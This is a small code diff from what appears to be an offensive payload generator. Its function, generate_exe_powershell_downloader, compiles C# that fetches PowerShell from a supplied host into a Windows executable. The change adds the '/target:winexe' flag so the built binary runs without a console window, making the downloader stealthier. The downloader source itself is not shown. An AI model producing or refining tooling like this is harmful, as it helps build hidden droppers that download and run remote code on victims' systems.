@@ -223,7 +223,7 @@ def generate_exe_powershell_downloader(hostname, path, proto, output_path):
 		f = open("tmp.cs", "w")
 		f.write(code)
 		f.close()
-		compile_command = "mono-csc /reference:includes/System.Management.Automation.dll tmp.cs /out:%s" % output_path
+		compile_command = "mono-csc /target:winexe /reference:includes/System.Management.Automation.dll tmp.cs /out:%s" % output_path
 		if os.system(compile_command) == 0:
 			print((colored("[+] file compiled successfully !", "green")))
 			print((colored("[+] binary file saved to {0}".format(output_path), "red")))
